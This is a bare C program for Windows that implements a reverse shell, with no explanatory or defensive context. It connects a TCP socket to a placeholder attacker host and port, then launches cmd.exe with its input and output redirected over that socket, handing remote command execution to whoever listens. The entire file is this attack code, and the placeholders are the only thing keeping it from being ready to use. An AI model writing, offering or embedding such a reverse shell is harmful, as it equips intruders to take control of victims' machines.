#include <winsock2.h>
#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("attacker_ip");
    server.sin_port = htons(attacker_port);

    connect(s, (struct sockaddr *)&server, sizeof(server));
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}